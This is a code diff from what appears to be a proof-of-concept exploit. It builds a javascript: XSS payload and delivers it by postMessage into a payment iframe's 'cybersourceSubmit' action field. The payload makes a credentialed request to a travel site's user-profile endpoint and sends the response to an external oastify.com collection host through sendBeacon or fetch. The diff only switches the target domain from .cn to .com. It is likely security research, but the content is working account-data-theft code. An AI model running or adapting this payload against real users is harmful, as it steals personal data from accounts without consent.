@@ -18,7 +18,7 @@ const XSS_PAYLOAD = "javascript:alert(1);void(function(){var T='"+TOKEN+"';"+
   "try{navigator.sendBeacon('https://juh9yfy721brvmz9vjsnzq9e75dw1o0cp.oastify.com/'+T,JSON.stringify(o));}"+
   "catch(e){try{fetch('https://juh9yfy721brvmz9vjsnzq9e75dw1o0cp.oastify.com/'+T,{method:'POST',mode:'no-cors',body:JSON.stringify(o)});}catch(e2){}}}"+
   "b('xss',{});"+
-  "try{fetch('https://www.klook.cn/v3/userserv/user/profile_service/get_my_profile_by_token?show_original=1',{credentials:'include'}).then(function(r){return r.text();}).then(function(x){b('ride',{n:x.length,resp:x.slice(0,3000)});}).catch(function(e){b('rideerr',{e:String(e)});});}"+
+  "try{fetch('https://www.klook.com/v3/userserv/user/profile_service/get_my_profile_by_token?show_original=1',{credentials:'include'}).then(function(r){return r.text();}).then(function(x){b('ride',{n:x.length,resp:x.slice(0,3000)});}).catch(function(e){b('rideerr',{e:String(e)});});}"+
   "catch(e){b('ridecatch',{e:String(e)});}"+
   "}())";
     document.getElementById('f').contentWindow.postMessage({type:'cybersourceSubmit',props:{cybersourcePayFromData:{action:XSS_PAYLOAD,data:{access_key:'AK',profile_id:'PF',merchant_id:'MID',transaction_uuid:'TU',signed_field_names:'a,b',unsigned_field_names:'c',signed_date_time:'2026-11-07T00:00:00Z',locale:'en',transaction_type:'sale',reference_number:'REF1',amount:'1.00',currency:'USD',payment_method:'card',bill_to_forename:'T',bill_to_surname:'U',bill_to_email:'t@example.com',merchant_defined_data5:'web'}}}}, '*');
